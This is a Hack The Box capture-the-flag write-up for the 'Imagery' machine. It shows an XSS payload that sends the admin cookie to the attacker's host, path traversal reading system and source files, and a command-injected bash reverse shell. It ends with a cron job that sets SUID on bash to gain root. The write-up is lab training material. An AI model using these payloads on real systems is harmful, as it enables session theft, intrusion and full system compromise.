---
title: Imagery [Medium]
published: false
date: 2025-10-04
tags: [htb, linux, nmap, xss, path traversal, lfi, password cracking, pyAesCrypt, dpyAesCrypt, charcol, penelope, cron]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/imagery-htb-season9
image: /assets/img/imagery-htb-season9/imagery-htb-season9_banner.png
---

# Imagery HTB Season 9
## Machine information
Author: [Nab6eel](https://app.hackthebox.com/users/2320711)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.98.213               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 23:57 EDT
Nmap scan report for 10.129.98.213
Host is up (1.8s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.72 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.98.213     imagery.htb
```

Let's check port `8000`.

### Web Enumeration
Go to `http://imagery.htb:8000`.

![Imagery Website](/assets/img/imagery-htb-season9/imagery-htb-season9_website.png)

Take some recon and does not found nothing much so let's register and login with new account.

![Imagery Website Register](/assets/img/imagery-htb-season9/imagery-htb-season9_website-register.png)

![Imagery Website Login](/assets/img/imagery-htb-season9/imagery-htb-season9_website-login.png)

![Imagery Website Dashboard](/assets/img/imagery-htb-season9/imagery-htb-season9_website-dashboard.png)

After login, we are in image gallery where we got upload function as a great feature that we can exploit to rce this website.

![Imagery Website Upload](/assets/img/imagery-htb-season9/imagery-htb-season9_website-upload.png)

We will upload some random image and see what we can do.

![Imagery Website Upload](/assets/img/imagery-htb-season9/imagery-htb-season9_website-upload-2.png)

As we can see that our user only got permission to **download** and **delete** image that the other 4 features we can not use as it has been disabled for our user. <br>
&rarr; So we double-check back the website if we missing something.

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug.png)

After scroll back to the main page, we forgot the bottom of the page where now we can see there is a report bug in **Quick Links** section. <br>
&rarr; Let's check it out.

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-2.png)

### XSS
First expression thinking about is xss as when we provide report, admin gonna look that this one and highly chance we can leverage this to get the admin cookie. <br>
&rarr; Gonna try normal report and see with burpsuite.

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-3.png)

So we can see from the response that "Admin review in progress". <br>
&rarr; Let's exploit this out.

Setup our python server to capture the request.

```bash
└─$ python3 -m http.server 80                                          
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

We are inject this payload below to the report form.

```txt
<img src=x onerror="this.src='http://10.10.16.13/steal?c='+btoa(document.cookie)">
```

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-4.png)

After hitting the submit button, we wait for a second or a minute and check our server.

```bash
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.98.213 - - [28/Sep/2025 05:16:17] code 404, message File not found
10.129.98.213 - - [28/Sep/2025 05:16:17] "GET /steal?c=c2Vzc2lvbj0uZUp3OWpiRU9nekFNUlBfRmM0VUVaY3BFUjc0aU1vbExMU1VHeGM2QUVQLU9vcW9kNzkzVDNRbVJkVTk0ekJFY1lMOE00UmxIZUFEcksyWVdjRllxdGVnNTcxUjBFelNXMVJ1cFZhVUM3bzFKdjhhUGVReGhxMkxfcmtIQlRPMmlyVTZjY2FWeWRCOWI0TG9CS3JNdjJ3LmFOajgydy52NFhsSGNnbDA3WG1ZdC10UE5leGRnaDdZTG8= HTTP/1.1" 404 -
```

Got the cookie for admin. <br>
&rarr; Decode it with base64 and we got the cookie.

```bash
session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNj82w.v4XlHcgl07XmYt-tPNexdgh7YLo
```

Let's go to devtools and replace our cookie with the one we got.

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-5.png)

Refresh the page.

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-6.png)

It appears **Admin Panel** next to the **Upload** one. <br>
&rarr; Click on it.

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-7.png)

We see two section that is **User Management** where we can download log from `admin` and `testuser`. <br>
And the **Submitted Bug Reports** is the one that we used to exploit the xss so that `admin` gonna review them. <br>
&rarr; Let's check out the download log from burpsuite.

### LFI
![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-8.png)

So we quickly thinking of path traversal that could lead us to `lfi`. <br>
&rarr; Let's try to read `/etc/passwd`.

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-9.png)

There we go! Keep exploit more and we can use this one [rfi-lfi-payload-list](https://github.com/payloadbox/rfi-lfi-payload-list) to get more information. <br>
&rarr; Gonna check some environment variable with `/proc/self/environ`.

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-10.png)

So we can see the path is `/home/web/web/` and we know that this website using `Werkzeug/3.1.3 Python/3.12.7`. <br>
&rarr; Take some time to research for the structure of this one.

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-11.png)

Let's check out the `app.py` see if we can find anything useful.

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-12.png)

So we can see the main part of website, we can take this foot step to go around and the code by looking at **import** and **from** on top of the code. <br>
&rarr; We saw there is `from config import *`, so we gonna check the `config.py`.

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-13.png)

Found `DATA_STORE_PATH = 'db.json'` so this is database file of the website. <br>
&rarr; Let's check it out.

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-14.png)

So we got two password that been encoded from `admin` and `testuser`. <br>
&rarr; Time to crack it with crackstation :D.

### Password Cracking
Using this one to crack [crackstation](https://crackstation.net/).

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-15.png)

We can crack only one password and that worked with `testuser@imagery.htb`. <br>
&rarr; `testuser:iambatman`.

Now login back with this founded credentials.

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-16.png)

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-17.png)

Notice that there is a `Manage Groups` button that our own user does not have it. <br>
&rarr; Let's upload a again and see if we can able to use the other features.

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-18.png)

Now we can able to transform image, convert, edit. <br>
&rarr; Head back to discover some source code if there is some sink we can leverage from these features to help us gain some initial footage inside the machine.

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-19.png)

We can see from the `api_edit.py` that inside **Tranform Image**, there is a features **Crop** we can use to modified the value to get our reverse shell cause these value go through `subprocess.run()`. <br>
&rarr; Let's reverse shell.

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-20.png)

Modified one of the four values to inject reverse shell.

```bash
; bash -c 'bash -i >& /dev/tcp/10.10.16.13/3333 0>&1'
```

It gonna be like this after modified.

```json
{
    "imageId":"ef3f608b-ee5e-49e5-998d-5b71d8665c38",
    "transformType":"crop",
    "params":{
        "x":0,
        "y":"; bash -c 'bash -i >& /dev/tcp/10.10.16.13/3333 0>&1'",
        "width":736,"height":1104
    }
}
```

Before send, prepare our setup listener.

```bash
└─$ penelope -p 3333         
[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.16.147.141 • 172.17.0.1 • 10.10.16.13
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Then hit send again and wait for few second.

```bash
└─$ penelope -p 3333         
[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.16.147.141 • 172.17.0.1 • 10.10.16.13
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from Imagery~10.129.98.213-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /home/web/web/env/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/Imagery~10.129.98.213-Linux-x86_64/2025_09_28-05_49_14-543.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
web@Imagery:~/web$
```

There we go, got ourself in `web` session.

### Discovery
Taking some enumeration around to see if we can find something useful.

```bash
web@Imagery:~/web$ id
uid=1001(web) gid=1001(web) groups=1001(web)
```

```bash
web@Imagery:/home$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Sep 22 18:56 .
drwxr-xr-x 20 root root 4096 Sep 22 19:10 ..
drwxr-x---  2 mark mark 4096 Sep 22 18:56 mark
drwxr-x---  7 web  web  4096 Sep 22 18:56 web
```

So there is another user `mark` as this one will be our next target to pwn.

```bash
web@Imagery:/var$ ls -la
total 60
drwxr-xr-x 14 root root   4096 Sep 22 18:56 .
drwxr-xr-x 20 root root   4096 Sep 22 19:10 ..
drwxr-xr-x  2 root root   4096 Sep 22 18:56 backup
drwxr-xr-x  3 root root   4096 Sep 23 16:31 backups
drwxr-xr-x 17 root root   4096 Sep 22 18:56 cache
drwxrwsrwt  2 root root   4096 Sep 28 06:25 crash
drwxr-xr-x 45 root root   4096 Sep 22 19:11 lib
drwxrwsr-x  2 root staff  4096 Sep 22 18:56 local
lrwxrwxrwx  1 root root      9 Oct  7  2024 lock -> /run/lock
drwxrwxr-x  8 root syslog 4096 Sep 28 04:24 log
drwxrwsr-x  2 root mail   4096 Sep 22 18:56 mail
drwxr-xr-x  2 root root   4096 Sep 22 18:56 opt
lrwxrwxrwx  1 root root      4 Oct  7  2024 run -> /run
drwxr-xr-x  8 root root   4096 Sep 22 18:56 snap
drwxr-xr-x  4 root root   4096 Sep 22 18:56 spool
drwxrwxrwt  9 root root   4096 Sep 28 04:47 tmp
-rw-r--r--  1 root root    208 Oct  7  2024 .updated
web@Imagery:/var$ cd backup
web@Imagery:/var/backup$ ls -la
total 22524
drwxr-xr-x  2 root root     4096 Sep 22 18:56 .
drwxr-xr-x 14 root root     4096 Sep 22 18:56 ..
-rw-rw-r--  1 root root 23054471 Aug  6  2024 web_20250806_120723.zip.aes
```

Found out this file in `backups`. <br>
&rarr; Gonna download it back to our kali and take a look at it.

```bash
web@Imagery:/var/backup$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

```bash
└─$ wget http://imagery.htb:8080/web_20250806_120723.zip.aes
```

> *This file is huge and take like more than 30 minute to get this boy down :D*

```bash
web@Imagery:/var/backup$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.16.13 - - [28/Sep/2025 09:55:47] "GET /web_20250806_120723.zip.aes HTTP/1.1" 200 -
```

### pyAesCrypt
```bash
└─$ file web_20250806_120723.zip.aes 
web_20250806_120723.zip.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
```

So this file is AES encrypted data so we need to got password in order to decrypt this file out.

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-21.png)

Take little time to searching and got this one [](https://github.com/Nabeelcn25/dpyAesCrypt.py) to help us out.

```bash
└─$ python3 dpyAesCrypt.py web_20250806_120723.zip.aes /usr/share/wordlists/rockyou.txt 

[🔐] dpyAesCrypt.py – pyAesCrypt Brute Forcer
                                                                                                                                                                                                              
[🔎] Starting brute-force with 10 threads...
[🔄] Progress: ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 0.00% | ETA: 00:00:00 | Tried 0/14344392/home/kali/HTB_Labs/GACHA_Season9/Imagery/dpyAesCrypt.py:42: DeprecationWarning: inputLength parameter is no longer used, and might be removed in a future version
  pyAesCrypt.decryptStream(fIn, fOut, password.strip(), buffer_size, os.path.getsize(encrypted_file))
[🔄] Progress: ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 0.01% | ETA: 17:12:22 | Tried 778/14344392

[✅] Password found: bestfriends                                                                                                                                                                              
🔓 Decrypt the file now? (y/n): y
/home/kali/HTB_Labs/GACHA_Season9/Imagery/dpyAesCrypt.py:142: DeprecationWarning: inputLength parameter is no longer used, and might be removed in a future version
  pyAesCrypt.decryptStream(fIn, fOut, cracked_pw, args.buffer, os.path.getsize(args.file))
[📁] File decrypted successfully as: web_20250806_120723.zip
```

Nailed th password for this file is `bestfriends`.

Let's unzip file this out and see what we got.

```bash
└─$ ls -la
total 100
drwxrwxr-x 6 kali kali  4096 Sep 28 11:22 .
drwxrwxr-x 4 kali kali  4096 Sep 28 11:22 ..
-rw-rw-r-- 1 kali kali  9784 Aug  5 08:56 api_admin.py
-rw-rw-r-- 1 kali kali  6398 Aug  5 08:56 api_auth.py
-rw-rw-r-- 1 kali kali 11876 Aug  5 08:57 api_edit.py
-rw-rw-r-- 1 kali kali  9091 Aug  5 08:57 api_manage.py
-rw-rw-r-- 1 kali kali   840 Aug  5 08:58 api_misc.py
-rw-rw-r-- 1 kali kali 12082 Aug  5 08:58 api_upload.py
-rw-rw-r-- 1 kali kali  1943 Aug  5 15:21 app.py
-rw-rw-r-- 1 kali kali  1809 Aug  5 08:59 config.py
-rw-rw-r-- 1 kali kali  1503 Aug  6 12:07 db.json
drwxrwxr-x 5 kali kali  4096 Sep 28 11:22 env
drwxrwxr-x 2 kali kali  4096 Sep 28 11:22 __pycache__
drwxrwxr-x 2 kali kali  4096 Sep 28 11:22 system_logs
drwxrwxr-x 2 kali kali  4096 Sep 28 11:22 templates
-rw-rw-r-- 1 kali kali  4023 Aug  5 09:00 utils.py
```

So probably get the entire source code. <br>
&rarr; Need to double-check again these file as when deploy to application, they maybe got modified before so this file is the one stored in backups so chance of modified is impossible.

```json
# db.json 
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "displayId": "f8p10uw0",
            "isTestuser": false,
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "displayId": "8utz23o5",
            "isTestuser": true,
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "web@imagery.htb",
            "password": "84e3c804cf1fa14306f26f9f3da177e0",
            "displayId": "7be291d4",
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
    ],
    "images": [],
    "bug_reports": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ]
}
```

There we go, got the password for `mark`. <br>
&rarr; Back to crackstation and crack it out.

![Imagery Website Report Bug](/assets/img/imagery-htb-season9/imagery-htb-season9_website-report-bug-22.png)

Got `mark:supersmash`.

```bash
└─$ ssh mark@imagery.htb
mark@imagery.htb: Permission denied (publickey).
```

Can not ssh directly so we will `su mark` from the `web` session where we got reverse shell.

```bash
web@Imagery:~/web$ su mark
Password: 
mark@Imagery:/home/web/web$ id
uid=1002(mark) gid=1002(mark) groups=1002(mark)
```

Okay, so far so good.

```bash
mark@Imagery:/home/web/web$ cd /home/mark/
mark@Imagery:~$ ls -la
total 24
drwxr-x--- 2 mark mark 4096 Sep 22 18:56 .
drwxr-xr-x 4 root root 4096 Sep 22 18:56 ..
lrwxrwxrwx 1 root root    9 Sep 22 13:21 .bash_history -> /dev/null
-rw-r--r-- 1 mark mark  220 Aug 20  2024 .bash_logout
-rw-r--r-- 1 mark mark 3771 Aug 20  2024 .bashrc
-rw-r--r-- 1 mark mark  807 Aug 20  2024 .profile
-rw-r----- 1 root mark   33 Sep 28 03:32 user.txt
mark@Imagery:~$ cat user.txt 
c394a8f27dcf7645ff760534a209e4c6
```

Grabed out `user.txt` flag.

## Initial Access
Let's take around inside `mark` session.

### Discovery
```bash
mark@Imagery:~$ sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

So we got sudo permission with `charcol`.

### charcol
Take a look at it.

```bash
mark@Imagery:~$ sudo /usr/local/bin/charcol -h
usage: charcol.py [--quiet] [-R] {shell,help} ...

Charcol: A CLI tool to create encrypted backup zip files.

positional arguments:
  {shell,help}          Available commands
    shell               Enter an interactive Charcol shell.
    help                Show help message for Charcol or a specific command.

options:
  --quiet               Suppress all informational output, showing only warnings and errors.
  -R, --reset-password-to-default
                        Reset application password to default (requires system password verification).
```

This one is a CLI tool for encrypted the AES file that we already crack it out. <br>
&rarr; Let's hit the `shell` to see what happen.

```bash
mark@Imagery:~$ sudo /usr/local/bin/charcol shell
Enter your Charcol master passphrase (used to decrypt stored app password): 

[2025-09-28 15:44:18] [ERROR] Incorrect master passphrase. 2 retries left. (Error Code: CPD-002)
Enter your Charcol master passphrase (used to decrypt stored app password):
```

As we saw, we do not have the `master passphrase` to enter and interative with this shell. <br>
But take a look at the options, we can see that there is `-R` that we can use to reset application again. <br>
&rarr; Let's give it a try.

```bash
mark@Imagery:~$ sudo /usr/local/bin/charcol -R

Attempting to reset Charcol application password to default.
[2025-09-28 15:44:41] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: 

[2025-09-28 15:44:46] [INFO] System password verified successfully.
Removed existing config file: /root/.charcol/.charcol_config
Charcol application password has been reset to default (no password mode).
Please restart the application for changes to take effect.
```

Okay, so we have set to not asking for password for next time we interative with the shell.

```bash
mark@Imagery:~$ sudo /usr/local/bin/charcol shell

First time setup: Set your Charcol application password.
Enter '1' to set a new password, or press Enter to use 'no password' mode: 
Are you sure you want to use 'no password' mode? (yes/no): yes
[2025-09-28 15:46:24] [INFO] Default application password choice saved to /root/.charcol/.charcol_config
Using 'no password' mode. This choice has been remembered.
Please restart the application for changes to take effect.
```

There we go, we can now restart and got into the shell.

```bash
mark@Imagery:~$ sudo /usr/local/bin/charcol shell

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0

[2025-09-28 15:46:31] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
charcol>
```

So what we gonna do to able to get `root`. <br>
&rarr; Have a look at `help`.

> *As this output a lot so you can check it out yourself. :>*

```bash
Automated Jobs (Cron):
    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
      Purpose: Add a new automated cron job managed by Charcol.
      Verification:
        - If '--app-password' is set (status 1): Requires Charcol application password (via global --app-password flag).
        - If 'no password' mode is set (status 2): Requires system password verification (in interactive shell).
      Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths.
      Examples:
        - Status 1 (encrypted app password), cron:
          CHARCOL_NON_INTERACTIVE=true charcol --app-password <app_password> auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs -p <file_password>" \
          --name "Daily Docs Backup" --log-output <log_file_path>
        - Status 2 (no app password), cron, unencrypted backup:
          CHARCOL_NON_INTERACTIVE=true charcol auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
          --name "Daily Docs Backup" --log-output <log_file_path>
        - Status 2 (no app password), interactive:
          auto add --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
          --name "Daily Docs Backup" --log-output <log_file_path>
          (will prompt for system password)
```

When checking the `help` menu, this one pop up idea that we can leverage this one to add the schedule and setup the suid for the `/usr/bin/bash` to help us escalated to `root`.

## Privilege Escalation
Let's get it to go.

### Cron Jobs Exploited
```bash
charcol> auto add --schedule "* * * * *" --command "chmod u+s /usr/bin/bash" --name "suid_bash"
[2025-09-28 15:53:12] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: 

[2025-09-28 15:53:23] [INFO] System password verified successfully.
[2025-09-28 15:53:23] [INFO] Auto job 'suid_bash' (ID: bf310c29-28da-46c2-95ae-eed88221e32b) added successfully. The job will run according to schedule.
[2025-09-28 15:53:23] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true chmod u+s /usr/bin/bash
```

Then we exit out the interactive shell.

```bash
mark@Imagery:~$ /usr/bin/bash -p
bash-5.2# id
uid=1002(mark) gid=1002(mark) euid=0(root) groups=1002(mark)
```

BOOM! We are now `root`.

```bash
bash-5.2# ls -la
total 24
drwxr-x--- 2 mark mark 4096 Sep 22 18:56 .
drwxr-xr-x 4 root root 4096 Sep 22 18:56 ..
lrwxrwxrwx 1 root root    9 Sep 22 13:21 .bash_history -> /dev/null
-rw-r--r-- 1 mark mark  220 Aug 20  2024 .bash_logout
-rw-r--r-- 1 mark mark 3771 Aug 20  2024 .bashrc
-rw-r--r-- 1 mark mark  807 Aug 20  2024 .profile
-rw-r----- 1 root mark   33 Sep 28 03:32 user.txt
bash-5.2# cd /root
bash-5.2# ls -al
total 115212
drwx------  9 root root      4096 Sep 28 03:32 .
drwxr-xr-x 20 root root      4096 Sep 22 19:10 ..
lrwxrwxrwx  1 root root         9 Sep 22 13:21 .bash_history -> /dev/null
-rw-rw-r--  1 root root        81 Jul 30 08:10 .bash_profile
-rw-r--r--  1 root root      3187 Jul 30 08:10 .bashrc
drwxr-xr-x  4 root root      4096 Sep 22 18:56 .cache
drwxr-xr-x  2 root root      4096 Sep 28 15:46 .charcol
-rw-r--r--  1 root root 117907496 Aug  1 11:15 chrome.deb
drwx------  3 root root      4096 Sep 22 18:56 .config
drwxrwxr-x  3 root root      4096 Sep 22 18:56 .cron
-rw-------  1 root root        20 Sep 19 10:00 .lesshst
drwxr-xr-x  5 root root      4096 Sep 22 18:56 .local
drwx------  3 root root      4096 Sep 22 18:56 .pki
-rw-r-----  1 root root        33 Sep 28 03:32 root.txt
-rw-r--r--  1 root root        66 Sep 22 10:49 .selected_editor
drwx------  2 root root      4096 Sep 22 18:56 .ssh
-rw-r--r--  1 root root       165 Sep 22 13:21 .wget-hsts
bash-5.2# cat root.txt
0924041115263757692af9b509d53979
```

Loot the `root.txt` flag.

![result](/assets/img/imagery-htb-season9/result.png)